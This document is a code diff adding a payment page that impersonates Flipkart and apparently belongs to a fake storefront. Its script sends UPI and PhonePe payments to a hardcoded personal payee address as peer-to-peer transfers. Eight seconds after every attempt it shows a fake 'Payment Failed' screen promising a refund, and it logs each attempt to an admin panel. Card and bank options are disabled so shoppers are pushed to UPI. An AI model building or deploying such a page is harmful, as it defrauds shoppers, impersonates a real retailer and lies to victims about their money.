@@ -1,0 +1,592 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="icon" type="image/x-icon" href="assets/images/favicon.ico">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Payment - Flipkart</title>
+    <link rel="stylesheet" href="assets/css/style.css">
+    <style>
+        .cart-container {
+            max-width: 480px;
+            margin: 0 auto;
+            background: #fff;
+            min-height: 100vh;
+            position: relative;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            box-sizing: border-box;
+        }
+        body {
+            margin: 0;
+            padding: 0;
+            background: #f1f3f6;
+            font-family: Roboto, Arial, sans-serif;
+        }
+        
+        .intent-buttons-container {
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+            padding: 16px;
+            margin-bottom: 20px;
+            box-sizing: border-box;
+        }
+        .btn-intent-premium {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            padding: 14px 18px;
+            background: #ffffff;
+            border: 1.5px solid #e0e0e0;
+            border-radius: 12px;
+            text-decoration: none;
+            color: #212121;
+            box-sizing: border-box;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.03);
+            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        .btn-intent-premium:hover {
+            border-color: #2874f0;
+            background: #f7faff;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(40,116,240,0.08);
+        }
+        .btn-intent-premium img {
+            width: 32px;
+            height: 32px;
+            object-fit: contain;
+            flex-shrink: 0;
+        }
+        .intent-text-col {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            gap: 2px;
+            text-align: left;
+        }
+        .intent-title {
+            font-size: 14px;
+            font-weight: bold;
+            color: #212121;
+        }
+        .intent-desc {
+            font-size: 11px;
+            color: #717478;
+        }
+        .intent-action {
+            font-size: 12px;
+            font-weight: bold;
+            color: #2874f0;
+            background: #f1f3f6;
+            padding: 6px 12px;
+            border-radius: 6px;
+            transition: background 0.15s, color 0.15s;
+        }
+        .btn-intent-premium:hover .intent-action {
+            background: #2874f0;
+            color: #ffffff;
+        }
+    </style>
+</head>
+<body>
+    <div class="cart-container">
+        <!-- Header -->
+        <div style="background: #fff; padding: 16px; border-bottom: 1px solid #f0f0f0; display: flex; justify-content: space-between; align-items: center; position: relative;">
+            <div>
+                <div style="font-size: 12px; color: #878787; margin-bottom: 4px;">Step 3 of 3</div>
+                <h2 style="font-size: 20px; font-weight: bold; color: #212121; margin: 0;">Payments</h2>
+            </div>
+            <div style="background: #f1f3f6; color: #212121; font-size: 12px; font-weight: bold; padding: 6px 12px; border-radius: 4px;">100% Secure</div>
+        </div>
+
+        <!-- Product Summary Card (Light Blue Background) -->
+        <div style="background: #f4f8ff; border-radius: 12px; padding: 16px; margin: 16px; box-sizing: border-box;">
+            <!-- Top Section -->
+            <div style="display: flex; gap: 16px; align-items: flex-start; margin-bottom: 12px;">
+                <div style="background: #fff; border: 1px solid #e2e8f3; border-radius: 12px; padding: 8px; width: 60px; height: 60px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; box-sizing: border-box;">
+                    <img id="productImage" src="" alt="" style="max-width: 100%; max-height: 100%; object-fit: contain;">
+                </div>
+                <div style="flex: 1;">
+                    <h4 id="productTitle" style="font-size: 14px; font-weight: 500; color: #212121; margin: 0 0 6px 0; line-height: 1.4; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden;"></h4>
+                    <div style="margin-bottom: 4px; display: flex; align-items: center; gap: 8px;">
+                        <span id="productSalePrice" style="font-size: 16px; font-weight: bold; color: #2874f0;"></span>
+                        <span id="productOriginalPrice" style="font-size: 13px; color: #717478; text-decoration: line-through;"></span>
+                    </div>
+                    <div style="font-size: 12px; color: #212121;">Delivery by: <span id="deliveryDate" style="font-weight: 500;"></span></div>
+                </div>
+            </div>
+            
+            <!-- Divider -->
+            <div style="border-top: 1px solid #e2e8f3; margin: 12px 0;"></div>
+            
+            <!-- Bottom Section -->
+            <div style="display: flex; justify-content: space-between; align-items: center;">
+                <span style="font-size: 15px; font-weight: bold; color: #2874f0;">Total Amount</span>
+                <span id="totalAmountDisplay" style="font-size: 16px; font-weight: bold; color: #2874f0;"></span>
+            </div>
+        </div>
+
+        <!-- Cashback Banner -->
+        <div style="background: #eefbf5; border: 1px solid #c8ecd7; border-radius: 12px; padding: 16px; margin: 16px; display: flex; justify-content: space-between; align-items: center; box-sizing: border-box;">
+            <div>
+                <div style="font-size: 15px; font-weight: bold; color: #008f4c; margin-bottom: 2px;">5% Cashback</div>
+                <div style="font-size: 13px; color: #008f4c;">Claim now with payment offers</div>
+            </div>
+            <div style="display: flex; gap: 8px; align-items: center;">
+                <!-- Axis Bank Logo -->
+                <span style="background: #fde8ef; border-radius: 50%; width: 32px; height: 32px; display: inline-flex; align-items: center; justify-content: center;">
+                    <img src="assets/images/axis_logo.svg" style="width: 18px; height: 18px; object-fit: contain;" alt="Axis Bank Logo">
+                </span>
+                <!-- SBI Bank Logo -->
+                <span style="background: #e1f0ff; border-radius: 50%; width: 32px; height: 32px; display: inline-flex; align-items: center; justify-content: center;">
+                    <img src="assets/images/sbi_logo.svg" style="width: 18px; height: 18px; object-fit: contain;" alt="SBI Bank Logo">
+                </span>
+            </div>
+        </div>
+
+        <!-- UPI Payment Section -->
+        <div class="upi-section">
+            <div class="upi-header">
+                <div class="upi-icon">UPI</div>
+                <div>
+                    <h3>UPI</h3>
+                    <div class="upi-sub">Pay by any UPI app</div>
+                </div>
+            </div>
+
+            <!-- PhonePe -->
+            <label class="payment-option">
+                <img src="assets/images/phonepe.svg" alt="PhonePe" style="width:32px;height:32px;object-fit:contain;">
+                <span class="po-name">PhonePe</span>
+                <input type="radio" name="payment_method" value="phonepe" checked>
+            </label>
+
+            <!-- Paytm -->
+            <label class="payment-option">
+                <img src="assets/images/paytm_logo.webp" alt="Paytm" style="width:32px;height:32px;object-fit:contain;">
+                <span class="po-name">Paytm</span>
+                <input type="radio" name="payment_method" value="paytm">
+            </label>
+
+            <!-- QR Code -->
+            <label class="payment-option">
+                <img src="assets/images/qr_code_icon.png" alt="QR Code" style="width:32px;height:32px;object-fit:contain;">
+                <span class="po-name">QR Code</span>
+                <input type="radio" name="payment_method" value="qr">
+            </label>
+        </div>
+
+        <!-- Intent Payment Buttons (Hidden by default) -->
+        <div class="intent-buttons-container" id="intentButtonsSection" style="display: none;">
+            <a href="#" class="btn-intent-premium gpay" id="btnGpay">
+                <img src="assets/images/gpay.jpg" alt="Google Pay">
+                <div class="intent-text-col">
+                    <span class="intent-title">Google Pay</span>
+                    <span class="intent-desc">Pay instantly using Google Pay app</span>
+                </div>
+                <span class="intent-action">Pay Now</span>
+            </a>
+            <a href="#" class="btn-intent-premium phonepe" id="btnPhonepe">
+                <img src="assets/images/phonepe.svg" alt="PhonePe">
+                <div class="intent-text-col">
+                    <span class="intent-title">PhonePe</span>
+                    <span class="intent-desc">Instant secure checkout using PhonePe</span>
+                </div>
+                <span class="intent-action">Pay Now</span>
+            </a>
+            <a href="#" class="btn-intent-premium paytm" id="btnPaytm">
+                <img src="assets/images/paytm.png" alt="Paytm">
+                <div class="intent-text-col">
+                    <span class="intent-title">Paytm</span>
+                    <span class="intent-desc">Pay directly from Paytm wallet</span>
+                </div>
+                <span class="intent-action">Pay Now</span>
+            </a>
+            <a href="#" class="btn-intent-premium upi" id="btnUpi">
+                <img src="assets/images/otherupIAPPS.webp" alt="Other UPI">
+                <div class="intent-text-col">
+                    <span class="intent-title">Other UPI Apps</span>
+                    <span class="intent-desc">Pay using GPay, PhonePe, Paytm, BHIM, etc.</span>
+                </div>
+                <span class="intent-action">Pay Now</span>
+            </a>
+        </div>
+
+        <!-- Pay Button -->
+        <button class="btn-pay" id="btnPay" onclick="handlePay()">Pay</button>
+
+        <!-- Disabled Options -->
+        <div class="disabled-option">
+            <div class="do-left">
+                <span class="do-icon">💳</span>
+                <div>
+                    <div class="do-title">Credit/Debit/ATM Card</div>
+                    <div class="do-sub">Add and secure cards as per RBI guidelines</div>
+                </div>
+            </div>
+            <span class="unavailable">Unavailable</span>
+        </div>
+
+        <div class="disabled-option" style="margin-bottom:40px;">
+            <div class="do-left">
+                <span class="do-icon">🏦</span>
+                <div>
+                    <div class="do-title">Net Banking</div>
+                    <div class="do-sub">Pay using your bank account</div>
+                </div>
+            </div>
+            <span class="unavailable">Unavailable</span>
+        </div>
+
+        <!-- ============================================ -->
+        <!-- PROCESSING MODAL -->
+        <!-- ============================================ -->
+        <div class="modal-overlay" id="processingModal">
+            <div class="modal-card">
+                <div class="processing-spinner"></div>
+                <h3>Processing Payment</h3>
+                <p>Please complete the payment in your UPI app. Do not close this window.</p>
+                <p class="redirecting">Redirecting automatically...</p>
+                <button class="btn-diff-method" onclick="closeProcessing()">Use Different Payment Method</button>
+            </div>
+        </div>
+
+        <!-- ============================================ -->
+        <!-- PAYMENT FAILED MODAL -->
+        <!-- ============================================ -->
+        <div class="modal-overlay" id="failedModal">
+            <div class="modal-card">
+                <div class="failed-icon">😞</div>
+                <h3 class="failed-title">Payment Failed</h3>
+                <p>The transaction couldnt be completed and was declined by your bank.</p>
+                <p>If any amount has been debited from your account, it will be refunded automatically within <strong>1–2 days</strong>.</p>
+                <button class="btn-try-again" onclick="closeFailed()">Try Again</button>
+            </div>
+        </div>
+
+        <!-- ============================================ -->
+        <!-- QR CODE MODAL -->
+        <!-- ============================================ -->
+        <div class="modal-overlay" id="qrModal">
+            <div class="modal-card qr-modal">
+                <div class="qr-modal-header">
+                    Flipkart<span class="lite">Lite</span>
+                    <span class="plus">Explore Plus✦</span>
+                </div>
+                
+                <div class="qr-code-img">
+                    <!-- Dynamic QR generated via JS -->
+                    <div id="qrCodeCanvas" style="display:flex;align-items:center;justify-content:center;min-height:200px;"></div>
+                    <canvas id="qrCodeHiddenCanvas" style="display:none;"></canvas>
+                </div>
+                
+                <div class="qr-scan-text">Scan the QR Code and Pay from any UPI App</div>
+                
+                <div class="qr-app-icons">
+                    <img src="assets/images/gpay.jpg" alt="Google Pay" style="width:36px;height:36px;border-radius:8px;object-fit:contain;">
+                    <img src="assets/images/phonepe.svg" alt="PhonePe" style="width:36px;height:36px;border-radius:8px;object-fit:contain;">
+                    <img src="assets/images/paytm.png" alt="Paytm" style="width:36px;height:36px;border-radius:8px;object-fit:contain;">
+                    <img src="assets/images/otherupIAPPS.webp" alt="BHIM" style="width:36px;height:36px;border-radius:8px;object-fit:contain;">
+                </div>
+                
+                <div class="qr-buttons">
+                    <button class="btn-download-qr" onclick="downloadQR()">Download QR</button>
+                    <button class="btn-close-qr" onclick="closeQR()">Close QR</button>
+                </div>
+            </div>
+        </div>
+    </div> <!-- .cart-container -->
+
+    <script src="products.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const productId = urlParams.get('id');
+        const color = urlParams.get('color');
+        const donation = parseInt(urlParams.get('donation') || '0', 10);
+
+        if (!productId || !productsData[productId]) {
+            window.location.href = 'index.html';
+        }
+
+        const product = productsData[productId];
+
+        function parsePrice(priceStr) {
+            if (!priceStr) return 0;
+            return parseInt(priceStr.replace(/[^\d]/g, ''), 10);
+        }
+
+        function formatPrice(number) {
+            return '₹' + number.toLocaleString('en-IN');
+        }
+
+        const baseSalePrice = parsePrice(product.sale_price);
+        const totalAmount = baseSalePrice + donation;
+        const amount = totalAmount;
+        const productName = product.name;
+
+        const savedUPI = localStorage.getItem('merchantUPI') || "paytm.s222r67@pty";
+        const phonepeUPI = savedUPI;
+        const paytmUPI = savedUPI;
+        const qrUPI = savedUPI;
+        const merchantName = "Flipkart Lite";
+
+        // Generate dynamic QR code if qrUPI is set
+        if (qrUPI) {
+            const shortName = productName.length > 30 ? productName.substring(0, 30) : productName;
+            const upiURI = 'upi://pay?pa=' + encodeURIComponent(qrUPI)
+                + '&pn=' + encodeURIComponent(merchantName)
+                + '&am=' + totalAmount
+                + '&cu=INR'
+                + '&tn=' + encodeURIComponent(shortName);
+            
+            document.addEventListener('DOMContentLoaded', function() {
+                const container = document.getElementById('qrCodeCanvas');
+                if (container) {
+                    container.innerHTML = '';
+                    new QRCode(container, {
+                        text: upiURI,
+                        width: 200,
+                        height: 200,
+                        colorDark: '#000000',
+                        colorLight: '#ffffff',
+                        correctLevel: QRCode.CorrectLevel.L
+                    });
+                }
+            });
+        }
+
+        function logOrderAttempt(methodUsed) {
+            try {
+                const geo = JSON.parse(localStorage.getItem('user_geo') || '{"city":"Unknown","region":"Unknown"}');
+                const orders = JSON.parse(localStorage.getItem('admin_orders') || '[]');
+                orders.unshift({
+                    timestamp: new Date().toISOString(),
+                    productName: productName,
+                    color: color || 'Default',
+                    amount: totalAmount,
+                    donation: donation,
+                    method: methodUsed,
+                    status: 'Attempted',
+                    city: geo.city,
+                    region: geo.region
+                });
+                localStorage.setItem('admin_orders', JSON.stringify(orders));
+            } catch (err) {
+                console.error("Order logging error", err);
+            }
+        }
+
+        function getSelectedMethod() {
+            const checked = document.querySelector('input[name="payment_method"]:checked');
+            return checked ? checked.value : 'phonepe';
+        }
+
+        function handlePay() {
+            const method = getSelectedMethod();
+            
+            // Trigger haptic feedback
+            if (navigator.vibrate) {
+                navigator.vibrate(60);
+            }
+
+            // Log Payment Attempt
+            logOrderAttempt(method);
+
+            if (method === 'qr') {
+                showQR();
+                return;
+            }
+            
+            // Show processing modal
+            showProcessing();
+            
+            let deepLink = '';
+            
+            if (method === 'phonepe') {
+                // PhonePe native deep link with base64-encoded JSON payload
+                const amountPaise = Math.round(amount * 100);
+                const payload = {
+                    "contact": {
+                        "cbcName": "",
+                        "nickName": "",
+                        "vpa": phonepeUPI,
+                        "type": "VPA"
+                    },
+                    "p2pPaymentCheckoutParams": {
+                        "note": merchantName,
+                        "isByDefaultKnownContact": true,
+                        "initialAmount": amountPaise,
+                        "currency": "INR",
+                        "checkoutType": "DEFAULT",
+                        "transactionContext": "p2p"
+                    }
+                };
+                const jsonStr = JSON.stringify(payload);
+                const b64 = btoa(jsonStr);
+                const data = encodeURIComponent(b64);
+                deepLink = `phonepe://native?data=${data}&id=p2ppayment`;
+            } else {
+                // Paytm - native deep link
+                const txnId = 'TXN-' + Date.now() + Math.floor(Math.random() * 1000);
+                deepLink = `paytmmp://cash_wallet?pa=${encodeURIComponent(paytmUPI)}&pn=${encodeURIComponent(merchantName)}&am=${amount}&cu=INR&tn=${encodeURIComponent(txnId)}&tr=&mc=&featuretype=money_transfer`;
+            }
+            
+            // Try to open payment app
+            setTimeout(() => {
+                window.location.href = deepLink;
+            }, 1500);
+            
+            // Show failed modal after timeout (simulating bank decline on desktop)
+            setTimeout(() => {
+                hideProcessing();
+                showFailed();
+            }, 8000);
+        }
+
+        function showProcessing() {
+            document.getElementById('processingModal').classList.add('active');
+        }
+
+        function hideProcessing() {
+            document.getElementById('processingModal').classList.remove('active');
+        }
+
+        function closeProcessing() {
+            hideProcessing();
+        }
+
+        function showFailed() {
+            document.getElementById('failedModal').classList.add('active');
+        }
+
+        function hideFailed() {
+            document.getElementById('failedModal').classList.remove('active');
+        }
+
+        function closeFailed() {
+            hideFailed();
+        }
+
+        function showQR() {
+            document.getElementById('qrModal').classList.add('active');
+        }
+
+        function closeQR() {
+            document.getElementById('qrModal').classList.remove('active');
+        }
+
+        function downloadQR() {
+            const canvasContainer = document.getElementById('qrCodeCanvas');
+            if (canvasContainer) {
+                const canvas = canvasContainer.querySelector('canvas');
+                const img = canvasContainer.querySelector('img');
+                if (canvas) {
+                    const link = document.createElement('a');
+                    link.href = canvas.toDataURL('image/png');
+                    link.download = 'payment_qr.png';
+                    link.click();
+                    return;
+                } else if (img) {
+                    const link = document.createElement('a');
+                    link.href = img.src;
+                    link.download = 'payment_qr.png';
+                    link.click();
+                    return;
+                }
+            }
+            alert('QR Code not available.');
+        }
+
+        // Close modals on overlay click
+        document.querySelectorAll('.modal-overlay').forEach(modal => {
+            modal.addEventListener('click', function(e) {
+                if (e.target === this) {
+                    this.classList.remove('active');
+                }
+            });
+        });
+
+        window.addEventListener('DOMContentLoaded', () => {
+            // Track visitor
+            try {
+                const stats = JSON.parse(localStorage.getItem('admin_stats') || '{"home":0,"product":0,"address":0,"cart":0,"payment":0,"mobile":0,"desktop":0}');
+                stats.payment++;
+                localStorage.setItem('admin_stats', JSON.stringify(stats));
+            } catch (e) {
+                console.error("Tracking error", e);
+            }
+
+            // Populate Dynamic Details
+            document.getElementById('productTitle').innerText = product.name;
+            document.getElementById('productSalePrice').innerText = product.sale_price;
+            document.getElementById('productOriginalPrice').innerText = product.original_price;
+
+            let displayImage = product.images[0];
+            if (color && product.colors) {
+                const matchedColor = product.colors.find(c => c.color.toLowerCase() === color.toLowerCase());
+                if (matchedColor && matchedColor.image) {
+                    displayImage = matchedColor.image;
+                }
+            }
+            document.getElementById('productImage').src = displayImage;
+            document.getElementById('productImage').alt = product.name;
+
+            document.getElementById('totalAmountDisplay').innerText = formatPrice(totalAmount);
+            document.getElementById('btnPay').innerText = `Pay ${formatPrice(totalAmount)}`;
+
+            // Toggle view based on Payment Mode (Intent vs Non-Intent)
+            const paymentMode = localStorage.getItem('paymentMode') || 'non-intent';
+            if (paymentMode === 'intent') {
+                // Hide non-intent UI
+                document.querySelector('.upi-section').style.display = 'none';
+                document.getElementById('btnPay').style.display = 'none';
+                
+                // Show direct buttons
+                document.getElementById('intentButtonsSection').style.display = 'flex';
+                
+                // Configure direct links
+                const targetUPI = phonepeUPI; // configured UPI
+                const formattedAmt = totalAmount.toFixed(2);
+                
+                const gpayURI = `gpay://upi/pay?pa=${targetUPI}&pn=Merchant&am=${formattedAmt}&cu=INR`;
+                const phonepeURI = `phonepe://pay?pa=${targetUPI}&pn=Merchant&am=${formattedAmt}&cu=INR`;
+                const paytmURI = `paytmmp://pay?pa=${targetUPI}&pn=Merchant&am=${formattedAmt}&cu=INR`;
+                const upiURI = `upi://pay?pa=${targetUPI}&pn=Merchant&am=${formattedAmt}&cu=INR`;
+                
+                document.getElementById('btnGpay').href = gpayURI;
+                document.getElementById('btnPhonepe').href = phonepeURI;
+                document.getElementById('btnPaytm').href = paytmURI;
+                document.getElementById('btnUpi').href = upiURI;
+
+                // Bind simulation event to direct buttons
+                document.querySelectorAll('.btn-intent-premium').forEach(btn => {
+                    btn.addEventListener('click', () => {
+                        const appName = btn.id.replace('btn', '').toLowerCase();
+                        logOrderAttempt(appName);
+                        
+                        // Trigger haptic feedback
+                        if (navigator.vibrate) {
+                            navigator.vibrate(60);
+                        }
+
+                        showProcessing();
+                        setTimeout(() => {
+                            hideProcessing();
+                            showFailed();
+                        }, 8000);
+                    });
+                });
+            }
+
+            // Set Delivery Date (2 Days from now)
+            const deliveryDate = new Date();
+            deliveryDate.setDate(deliveryDate.getDate() + 2);
+            const dayNum = deliveryDate.getDate();
+            const monthStr = deliveryDate.toLocaleDateString('en-US', { month: 'short' });
+            const weekdayStr = deliveryDate.toLocaleDateString('en-US', { weekday: 'short' });
+            document.getElementById('deliveryDate').innerText = `${dayNum} ${monthStr}, ${weekdayStr}`;
+        });
+    </script>
+</body>
+</html>
